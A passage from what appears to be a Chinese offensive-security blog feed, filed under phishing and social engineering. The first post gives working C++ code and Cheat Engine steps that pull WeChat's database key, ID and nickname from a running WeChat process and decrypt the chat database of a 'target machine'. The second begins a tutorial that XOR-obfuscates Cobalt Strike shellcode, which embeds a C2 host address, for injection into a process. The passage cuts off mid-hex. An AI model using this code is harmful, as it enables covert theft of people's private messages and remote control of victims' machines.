fseek(fpdb, 0, SEEK_END);    long nFileSize = ftell(fpdb);    fseek(fpdb, 0, SEEK_SET);    unsigned char* pDbBuffer = new unsigned char[nFileSize];    fread(pDbBuffer, 1, nFileSize, fpdb);    fclose(fpdb);    unsigned char salt[16] = { 0 };    memcpy(salt, pDbBuffer, 16);#ifndef NO_USE_HMAC_SHA1    unsigned char mac_salt[16] = { 0 };    memcpy(mac_salt, salt, 16);    for (int i = 0; i &lt; sizeof(salt); i++)    {        mac_salt[i] ^= 0x3a;    }#endif    int reserve = IV_SIZE;      //校验码长度,PC端每4096字节有48字节#ifndef NO_USE_HMAC_SHA1    reserve += HMAC_SHA1_SIZE;#endif    reserve = ((reserve % AES_BLOCK_SIZE) == 0) ? reserve : ((reserve / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;    unsigned char key[KEY_SIZE] = { 0 };    unsigned char mac_key[KEY_SIZE] = { 0 };    OpenSSL_add_all_algorithms();    PKCS5_PBKDF2_HMAC_SHA1((const char*)pass, sizeof(pass), salt, sizeof(salt), DEFAULT_ITER, sizeof(key), key);#ifndef NO_USE_HMAC_SHA1    PKCS5_PBKDF2_HMAC_SHA1((const char*)key, sizeof(key), mac_salt, sizeof(mac_salt), 2, sizeof(mac_key), mac_key);#endif    unsigned char* pTemp = pDbBuffer;    unsigned char pDecryptPerPageBuffer[DEFAULT_PAGESIZE];    int nPage = 1;    int offset = 16;    while (pTemp &lt; pDbBuffer + nFileSize)    {        printf(&quot;解密数据页:%d/%d \n&quot;, nPage, nFileSize / DEFAULT_PAGESIZE);#ifndef NO_USE_HMAC_SHA1        unsigned char hash_mac[HMAC_SHA1_SIZE] = { 0 };        unsigned int hash_len = 0;        HMAC_CTX hctx;        HMAC_CTX_init(&amp;hctx);        HMAC_Init_ex(&amp;hctx, mac_key, sizeof(mac_key), EVP_sha1(), NULL);        HMAC_Update(&amp;hctx, pTemp + offset, DEFAULT_PAGESIZE - reserve - offset + IV_SIZE);        HMAC_Update(&amp;hctx, (const unsigned char*)&amp;nPage, sizeof(nPage));        HMAC_Final(&amp;hctx, hash_mac, &amp;hash_len);        HMAC_CTX_cleanup(&amp;hctx);        if (0 != memcmp(hash_mac, pTemp + DEFAULT_PAGESIZE - reserve + IV_SIZE, sizeof(hash_mac)))        {            //printf(&quot;\n 哈希值错误! \n&quot;);            //getchar();            //return 0;        }#endif        //        if (nPage == 1)        {            memcpy(pDecryptPerPageBuffer, SQLITE_FILE_HEADER, offset);        }        EVP_CIPHER_CTX* ectx = EVP_CIPHER_CTX_new();        EVP_CipherInit_ex(ectx, EVP_get_cipherbyname(&quot;aes-256-cbc&quot;), NULL, NULL, NULL, 0);        EVP_CIPHER_CTX_set_padding(ectx, 0);        EVP_CipherInit_ex(ectx, NULL, NULL, key, pTemp + (DEFAULT_PAGESIZE - reserve), 0);        int nDecryptLen = 0;        int nTotal = 0;        EVP_CipherUpdate(ectx, pDecryptPerPageBuffer + offset, &amp;nDecryptLen, pTemp + offset, DEFAULT_PAGESIZE - reserve - offset);        nTotal = nDecryptLen;        EVP_CipherFinal_ex(ectx, pDecryptPerPageBuffer + offset + nDecryptLen, &amp;nDecryptLen);        nTotal += nDecryptLen;        EVP_CIPHER_CTX_free(ectx);        memcpy(pDecryptPerPageBuffer + DEFAULT_PAGESIZE - reserve, pTemp + DEFAULT_PAGESIZE - reserve, reserve);        char decFile[1024] = { 0 };        sprintf_s(decFile, &quot;dec_%s&quot;, dbfilename);        FILE* fp;        fopen_s(&amp;fp, decFile, &quot;ab+&quot;);        {            fwrite(pDecryptPerPageBuffer, 1, DEFAULT_PAGESIZE, fp);            fclose(fp);        }        nPage++;        offset = 0;        pTemp += DEFAULT_PAGESIZE;    }    printf(&quot;\n 解密成功! \n&quot;);    return 0;}</code></pre><p>编译出来exe，运行的时候跟上要解密的db文件即可</p><p><img src="/img/wechatDecrypt/21b66592-61ef-47be-8295-3d32612a6d43.png" alt="img"></p><p>解密结束后会在当前目录生成dec_MicroMsg.db文件。然后用打开sqlite3数据库的连接工具打开即可。</p><p><img src="/img/wechatDecrypt/661726c9-3400-4104-895f-06ef1e49b901.png" alt="img"></p><h2 id="0x03-CE寻找密钥的基址"><a href="#0x03-CE寻找密钥的基址" class="headerlink" title="0x03 CE寻找密钥的基址"></a>0x03 CE寻找密钥的基址</h2><p>下一步是如何获取动态密钥</p><p>方法是使用CE取寻找密钥的基址</p><p>先下载CE，下载地址</p><pre><code>https://d7qe0znl1rfet.cloudfront.net/installer/575474003088649/859880</code></pre><p>再下载中文语言包</p><pre><code>https://www.cheatengine.org/download/ch_cn.zip</code></pre><p>安装CE后，将中文语言包解压后放到该目录下</p><p><img src="/img/wechatDecrypt/bd146572-9a4d-40db-a157-bf9118cd9828.png" alt="img"></p><p>编辑language,ini文件</p><p><img src="/img/wechatDecrypt/2f16b4e4-127e-4174-a8bc-39e9e49fa54c.png" alt="img"></p><p>此时打开CE即使中文版，选择打开进程</p><p><img src="/img/wechatDecrypt/22f9b15b-909c-496c-8fcb-9e02a11b8f6a.png" alt="img"></p><p>选择微信进程</p><p><img src="/img/wechatDecrypt/d67599f8-9ded-4be5-9174-0f442b1bd290.png" alt="img"></p><p>通过之前找到的密钥去定位基址</p><pre><code>6F509B68384C46688BA08C54E10ADA7421300987528443AF8ECFC914F4DF9519</code></pre><p>字节数组–&gt;搜索数组–&gt;Hex–&gt;密钥值</p><p><img src="/img/wechatDecrypt/7458e12b-1a08-4228-bf9d-d47fc3cbe477.png" alt="img"></p><p>点击首次扫描，得到地址05E4BE68</p><p><img src="/img/wechatDecrypt/625e3dbc-da8d-4b9b-96b8-bac54ff7939a.png" alt="img"></p><p>新的扫描–&gt;所有类型–&gt;精确数值–&gt;Hex–&gt;上一步的地址–&gt;首次扫描</p><p><img src="/img/wechatDecrypt/fbe51b19-6d50-40bd-bcb1-a1a5ee17132f.png" alt="img"></p><p>得到了偏移量，即：WeChatWin.dll+1AD1F8C</p><p><img src="/img/wechatDecrypt/f6d65c6f-b530-4b40-bd5a-82b479871602.png" alt="img"></p><h2 id="0x04-实现获取动态密钥的代码"><a href="#0x04-实现获取动态密钥的代码" class="headerlink" title="0x04 实现获取动态密钥的代码"></a>0x04 实现获取动态密钥的代码</h2><p>最后就可以通过代码去获取，步骤则是</p><p>通过WeChatMainWndForPC获取微信的句柄，通过该句柄获取到微信的进程id，再找到微信的安装目录，拼接路径得到WeChatWin.dll的路径，通过上一步的偏移量得到密钥的值。</p><p>同理获取微信id和微信名的偏移量</p><p>字符串搜索微信id，找到了很多地址，选择05E开头的，因为密钥的偏移量是05E开头的，那么猜测微信id可能也存在同一个dll里，即WeChatWin.dll里</p><p><img src="/img/wechatDecrypt/540af94d-a9bf-414f-b325-64914bc60095.png" alt="img"></p><p>得到偏移量</p><p><img src="/img/wechatDecrypt/606a18a8-f4dc-4ef8-ad67-e377044cb80d.png" alt="img"></p><p>同理可以获取微信名称的偏移量。</p><p>核心代码如下：</p><p>getKey.h</p><pre><code>#pragma once#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;#include &lt;direct.h&gt;#include &lt;stdlib.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;string&gt;#include &lt;strstream&gt;#include &lt;list&gt;#include &lt;Psapi.h&gt;  #pragma comment (lib,&quot;Psapi.lib&quot;)  #pragma comment(lib, &quot;Version.lib&quot;)using namespace std;const string wxVersoin1 = &quot;2.9.0.123&quot;;#define version1 0x16B4D50#define wxid_addr1 0x16B4914#define wxname_addr1 0x16B498Cconst string wxVersoin2 = &quot;2.9.0.112&quot;;#define version2 0x16B4C70#define wxid_addr2 0x16B4834#define wxname_addr2 0x16B48ACconst string wxVersoin3 = &quot;2.9.5.56&quot;;#define version3 0x17744A8#define wxid_addr3 0x1774054#define wxname_addr3 0x17740CCconst string wxVersoin4 = &quot;3.2.1.154&quot;;#define version4 0x1AD1F8C#define wxid_addr4 0x1AC2100#define wxname_addr4 0x1AD1BACDWORD GetProcessIDByName(const char* pName);PVOID GetProcessImageBase(DWORD dwProcessId, const char* dllName);DWORD IsWxVersionValid(WCHAR* VersionFilePath);int GetdbKey(unsigned char* databasekey, unsigned char* wxid);</code></pre><p>getKey.cpp</p><pre><code>#include &quot;getKey.h&quot;#include &lt;iostream&gt;//判断微信版本，确定偏移DWORD IsWxVersionValid(WCHAR* VersionFilePath){    string asVer = &quot;&quot;;    VS_FIXEDFILEINFO* pVsInfo;    unsigned int iFileInfoSize = sizeof(VS_FIXEDFILEINFO);    int iVerInfoSize = GetFileVersionInfoSizeW(VersionFilePath, NULL);    if (iVerInfoSize != 0) {        char* pBuf = new char[iVerInfoSize];        if (GetFileVersionInfoW(VersionFilePath, 0, iVerInfoSize, pBuf)) {            if (VerQueryValue(pBuf, TEXT(&quot;\\&quot;), (void**)&amp;pVsInfo, &amp;iFileInfoSize)) {                //主版本2.9.0.123                //2                int s_major_ver = (pVsInfo-&gt;dwFileVersionMS &gt;&gt; 16) &amp; 0x0000FFFF;                //9                int s_minor_ver = pVsInfo-&gt;dwFileVersionMS &amp; 0x0000FFFF;                //0                int s_build_num = (pVsInfo-&gt;dwFileVersionLS &gt;&gt; 16) &amp; 0x0000FFFF;                //123                int s_revision_num = pVsInfo-&gt;dwFileVersionLS &amp; 0x0000FFFF;                //把版本变成字符串                strstream wxVer;                wxVer &lt;&lt; s_major_ver &lt;&lt; &quot;.&quot; &lt;&lt; s_minor_ver &lt;&lt; &quot;.&quot; &lt;&lt; s_build_num &lt;&lt; &quot;.&quot; &lt;&lt; s_revision_num;                wxVer &gt;&gt; asVer;            }        }        delete[] pBuf;    }    printf(&quot;var = %s\n&quot;, asVer.c_str());    if (asVer == wxVersoin1)        return version1;    else if (asVer == wxVersoin2)        return version2;    else if (asVer == wxVersoin3)        return version3;    else if (asVer == wxVersoin4)        return version4;    else        return 0;    return version4;}//通过pid和模块名获取基址PVOID GetProcessImageBase(DWORD dwProcessId, const char* dllName){    PVOID pProcessImageBase = NULL;    MODULEENTRY32 me32 = { 0 };    me32.dwSize = sizeof(MODULEENTRY32);    // 获取指定进程全部模块的快照    HANDLE hModuleSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);    if (INVALID_HANDLE_VALUE == hModuleSnap)    {        return pProcessImageBase;    }    // 获取快照中第一条信息    BOOL bRet = ::Module32First(hModuleSnap, &amp;me32);    while (strcmp((char*)me32.szModule, dllName) != 0)    {        Module32Next(hModuleSnap, &amp;me32);    }    pProcessImageBase = (PVOID)me32.modBaseAddr;    // 关闭句柄    ::CloseHandle(hModuleSnap);    return pProcessImageBase;}//获取数据库密钥int GetdbKey(unsigned char* databasekey, unsigned char* wxid){    HWND phandle = FindWindow(&quot;WeChatMainWndForPC&quot;, NULL);//获取句柄    if (!phandle)    {        printf(&quot;%d\n&quot;, GetLastError());        return 0;    }    DWORD pid;    GetWindowThreadProcessId(phandle, &amp;pid);//获取进程id    if (!pid)    {        return 0;    }    printf(&quot;wechat pid = %d\n&quot;, pid);    HANDLE mProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);    if (mProc == NULL)    {        return 0;    }    wchar_t path[MAX_PATH];    if (!GetModuleFileNameExW(mProc, NULL, path, MAX_PATH))        return 0;    else    {        // cout &lt;&lt; &quot;path&quot; &lt;&lt; path &lt;&lt; endl;        for (int i = 0; i &lt; sizeof(path); ++i) {            cout &lt;&lt; (char)path[i];            if (path[i] == &#39;.&#39;)            {                wcscpy_s(&amp;path[i], sizeof(L&quot;Win.dll&quot;), L&quot;Win.dll&quot;);                break;            }        }    }    cout &lt;&lt; endl;    for (int i = 0; i &lt; sizeof(path); ++i) {        cout &lt;&lt; (char)path[i];    }    //DWORD WxDatabaseKey = IsWxVersionValid(path);    //if (!WxDatabaseKey)    //  return 0;    DWORD WxDatabaseKey = version4;    //获取WeChatWin的基址    DWORD base_address = (DWORD)GetProcessImageBase(pid, &quot;WeChatWin.dll&quot;);    // printf(&quot;dllbase_address = %p\n&quot;, base_address);    DWORD dwKeyAddr = base_address + WxDatabaseKey;    //printf(&quot;Addr = %p\n&quot;, dwKeyAddr);    int addr = 0;    DWORD dwOldAttr = 0;    //获取数据库密钥    ReadProcessMemory(mProc, (LPCVOID)dwKeyAddr, &amp;addr, 4, NULL);    //printf(&quot;key addr = %x\n&quot;, addr);    ReadProcessMemory(mProc, (LPCVOID)addr, databasekey, 0x20, NULL);    unsigned char wxname[100] = { 0 };    //获取微信昵称    DWORD wxAddr = base_address + wxname_addr4;    //printf(&quot;wxAddr = %x\n&quot;, wxAddr);    ReadProcessMemory(mProc, (LPCVOID)wxAddr, wxname, 100, NULL);    printf(&quot;\nname: %s\n&quot;, wxname);    //获取微信id    wxAddr = base_address + wxid_addr4;    //printf(&quot;wxAddr = %x\n&quot;, wxAddr);    ReadProcessMemory(mProc, (LPCVOID)wxAddr, &amp;addr, 4, NULL);    //printf(&quot;wxid addr = %x\n&quot;, addr);    ReadProcessMemory(mProc, (LPCVOID)addr, wxid, 100, NULL);    printf(&quot;wxid: %s\n&quot;, wxid);    //打印密钥    printf(&quot;key: &quot;);    for (int i = 0; i &lt; 0x20; i++)    {        printf(&quot;%02x&quot;, databasekey[i]);    }    return 1;}</code></pre><p>wechatKey.cpp</p><pre><code>// wechatKey.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &quot;Getkey.h&quot;unsigned char pass[33] = { 0 };unsigned char filepath[256] = { 0 };unsigned char wxid[256] = { 0 };int main(){    std::cout &lt;&lt; &quot;Hello World!\n&quot;;    GetdbKey(pass, wxid);}</code></pre><p>运行工具得到密钥</p><p><img src="/img/wechatDecrypt/015f7461-031b-475f-bbcb-52ff97ce98d3.png" alt="img"></p><h2 id="0x05-实战"><a href="#0x05-实战" class="headerlink" title="0x05 实战"></a>0x05 实战</h2><p>下载MSG0.db文件</p><p><img src="/img/wechatDecrypt/2b990a2d-3076-42a3-9aad-9a3996251185.jpg" alt="img"></p><p>获取密钥</p><p><img src="/img/wechatDecrypt/3d433d84-8ef8-483f-8906-3ea491445fe2.jpg" alt="img"></p><p>本地解密得到聊天数据内容</p><p><img src="/img/wechatDecrypt/f5efd472-2a45-4620-975a-1336e6bc0299.png" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>每一个微信号在每一台机器上面的密钥是固定的，所以只要目标机器登录了微信，那么就可以通过该工具动态获取密钥。然后拖回MSG0.db聊天记录的数据库，解密即可。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>核心思路 https://www.xuenixiang.com/thread-2409-1-1.htmlhttps://bbs.pediy.com/thread-251303.htmhttps://www.dongzt.cn/archives/495.htmlhttps://www.52pojie.cn/thread-1084703-1-1.htmlhttps://blog.csdn.net/weixin_30230009/article/details/105100181配置openssl教程 https://bbs.pediy.com/thread-251303-1.htm基址寻找 https://zhuanlan.zhihu.com/p/95932843核心代码 https://github.com/A2kaid/Get-WeChat-DB</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之某信聊天记录解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode进程注入</title>
      <link href="/2021/03/09/shellcode-jin-cheng-zhu-ru/"/>
      <url>/2021/03/09/shellcode-jin-cheng-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="shellcode进程注入理解"><a href="#shellcode进程注入理解" class="headerlink" title="shellcode进程注入理解"></a>shellcode进程注入理解</h1><p>流程：将cs生成的shellcode异或，然后打开某个进程，开辟一段内存，将异或后的shellcode注入到内存里，再异或回去，然后创建一个新的线程运行上线到CS</p><h2 id="0x01-cs生成C语言的shellcode"><a href="#0x01-cs生成C语言的shellcode" class="headerlink" title="0x01 cs生成C语言的shellcode"></a>0x01 cs生成C语言的shellcode</h2><pre><code>/* length: 799 bytes */unsigned char buf[] = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x48\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x37\x33\x33\x37\x33\x34\x31\x32\x31\x32\x37\x3b\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x4c\x69\x6e\x75\x78\x3b\x20\x41\x6e\x64\x72\x6f\x69\x64\x20\x34\x2e\x31\x2e\x31\x3b\x20\x4e\x65\x78\x75\x73\x20\x37\x20\x42\x75\x69\x6c\x64\x2f\x4a\x52\x4f\x30\x33\x44\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x35\x2e\x31\x39\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x0d\x0a\x00\x04\x27\xd4\x1f\x4b\x1c\x41\xc2\x45\x72\xa8\xe8\xb5\x72\x59\xc4\x0a\x5b\x9e\xa2\xa3\x2b\x9c\xdd\x1e\x7b\x9f\xfd\x89\xd0\xd4\x39\x68\x0d\x03\x24\xd8\x12\x54\xb0\xd4\x12\x40\xbe\x19\xad\x02\x6f\x6b\xc0\xb8\x2b\x15\x60\x1f\xe0\xa1\xfd\xb3\xb4\x49\x89\x75\x15\xb0\xac\x7e\xcb\xc9\x44\xe0\x52\xc8\x02\x57\xd0\xed\x0d\xd4\xb3\x60\xc4\xa4\x9d\xa0\xb7\xd8\xec\xc6\xef\xe1\xf4\x37\x1a\x8f\xb1\xbd\x08\xcd\x03\x0c\xf8\x68\xe3\xae\xa3\xfc\x76\x47\xa9\x9a\x04\x48\xc5\x28\xae\x09\x2d\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x28\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x33\x36\x2e\x31\x30\x31\x2e\x32\x30\x36\x2e\x32\x30\x37\x00\x27\x31\x4b\x59&quot;;</code></pre><p>使用下面的py脚本简单的异或下</p><pre><code>#!/usr/bin/pythonimport sysraw_data = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x48\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x37\x33\x33\x37\x33\x34\x31\x32\x31\x32\x37\x3b\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x4c\x69\x6e\x75\x78\x3b\x20\x41\x6e\x64\x72\x6f\x69\x64\x20\x34\x2e\x31\x2e\x31\x3b\x20\x4e\x65\x78\x75\x73\x20\x37\x20\x42\x75\x69\x6c\x64\x2f\x4a\x52\x4f\x30\x33\x44\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x35\x2e\x31\x39\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x0d\x0a\x00\x04\x27\xd4\x1f\x4b\x1c\x41\xc2\x45\x72\xa8\xe8\xb5\x72\x59\xc4\x0a\x5b\x9e\xa2\xa3\x2b\x9c\xdd\x1e\x7b\x9f\xfd\x89\xd0\xd4\x39\x68\x0d\x03\x24\xd8\x12\x54\xb0\xd4\x12\x40\xbe\x19\xad\x02\x6f\x6b\xc0\xb8\x2b\x15\x60\x1f\xe0\xa1\xfd\xb3\xb4\x49\x89\x75\x15\xb0\xac\x7e\xcb\xc9\x44\xe0\x52\xc8\x02\x57\xd0\xed\x0d\xd4\xb3\x60\xc4\xa4\x9d\xa0\xb7\xd8\xec\xc6\xef\xe1\xf4\x37\x1a\x8f\xb1\xbd\x08\xcd\x03\x0c\xf8\x68\xe3\xae\xa3\xfc\x76\x47\xa9\x9a\x04\x48\xc5\x28\xae\x09\x2d\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x28\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x33\x36\x2e\x31\x30\x31\x2e\x32\x30\x36\x2e\x32\x30\x37\x00\x27\x31\x4b\x59&quot;new_shellcode = []for opcode in raw_data:    new_opcode = (ord(opcode) ^ 0x01)    new_shellcode.append(new_opcode)print &quot;&quot;.join([&quot;\\x{0}&quot;.format(hex(abs(i)).replace(&quot;0x&quot;, &quot;&quot;)) for i in new_shellcode])</code></pre><p>得到异或后的字符串</p><pre><code>\xfd\xe9\x88\x1\x1\x1\x61\x88\xe4\x30\xd3\x65\x8a\x53\x31\x8a\x53\xd\x8a\x53\x15\x8a\x73\x29\xe\xb6\x4b\x27\x30\xfe\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\xc0\xce\xc\x0\xc6\xe3\xf1\x53\x56\x8a\x53\x11\x8a\x43\x3d\x0\xd1\x8a\x41\x79\x84\xc1\x75\x4b\x0\xd1\x51\x8a\x49\x19\x8a\x59\x21\x0\xd2\xe2\x3d\x48\x8a\x35\x8a\x0\xd7\x30\xfe\x30\xc1\xad\xc0\xce\xc\x0\xc6\x39\xe1\x74\xf5\x2\x7c\xf9\x3a\x7c\x25\x74\xe3\x59\x8a\x59\x25\x0\xd2\x67\x8a\xd\x4a\x8a\x59\x1d\x0\xd2\x8a\x5\x8a\x0\xd1\x88\x45\x25\x25\x5a\x5a\x60\x58\x5b\x50\xfe\xe1\x59\x5e\x5b\x8a\x13\xea\x87\x5c\x69\x6f\x64\x75\x1\x69\x76\x68\x6f\x68\x55\x69\x4d\x76\x27\x6\xfe\xd4\x30\xfe\x56\x56\x56\x56\x56\x69\x3b\x57\x78\xa6\xfe\xd4\xe8\x85\x1\x1\x1\x5a\x30\xc8\x50\x50\x6b\x2\x50\x50\x69\x51\x1\x1\x1\x52\x51\x69\x56\x88\x9e\xc7\xfe\xd4\xea\x71\x5a\x30\xd3\x53\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x7e\xc5\x82\x7\xe7\x94\xd7\x24\x3e\x70\xae\xc\x8e\x30\xbc\xb9\x8d\xad\xe1\xb1\xdd\xcf\xb5\xca\xc3\x81\x6e\xb4\xe6\xe4\xd3\x25\x7\x1c\x87\xd1\xc8\x8a\x61\x46\x40\x8d\x5c\xd8\x63\xc3\x41\xb5\x4e\x9e\x49\x32\x58\x89\xae\x44\x1\x49\x6e\x72\x75\x3b\x21\x6d\x6e\x66\x68\x2f\x60\x6d\x68\x78\x74\x6f\x65\x73\x68\x77\x64\x2f\x62\x6e\x6c\xc\xb\x42\x6e\x6e\x6a\x68\x64\x3b\x21\x50\x68\x49\x6e\x6e\x46\x54\x48\x45\x3c\x42\x38\x47\x40\x37\x35\x32\x33\x40\x47\x36\x34\x2f\x30\x34\x36\x32\x32\x36\x32\x35\x30\x33\x30\x33\x36\x3a\xc\xb\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x34\x2f\x31\x21\x29\x4d\x68\x6f\x74\x79\x3a\x21\x40\x6f\x65\x73\x6e\x68\x65\x21\x35\x2f\x30\x2f\x30\x3a\x21\x4f\x64\x79\x74\x72\x21\x36\x21\x43\x74\x68\x6d\x65\x2e\x4b\x53\x4e\x31\x32\x45\x28\x21\x40\x71\x71\x6d\x64\x56\x64\x63\x4a\x68\x75\x2e\x34\x32\x34\x2f\x30\x38\x21\x29\x4a\x49\x55\x4c\x4d\x2d\x21\x6d\x68\x6a\x64\x21\x46\x64\x62\x6a\x6e\x28\xc\xb\x1\x5\x26\xd5\x1e\x4a\x1d\x40\xc3\x44\x73\xa9\xe9\xb4\x73\x58\xc5\xb\x5a\x9f\xa3\xa2\x2a\x9d\xdc\x1f\x7a\x9e\xfc\x88\xd1\xd5\x38\x69\xc\x2\x25\xd9\